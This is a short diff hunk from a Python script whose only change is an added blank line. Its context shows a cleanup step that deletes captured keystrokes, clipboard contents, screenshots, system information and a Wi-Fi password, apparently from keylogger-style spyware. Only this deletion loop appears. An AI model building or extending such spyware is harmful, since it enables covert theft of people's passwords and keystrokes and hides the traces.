@@ -266,3 +266,4 @@ time.sleep(120) # Sleep two minutes before deleting all files
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, wifi_password]
 for file in delete_files:
     os.remove(file_path + extend + file)
+
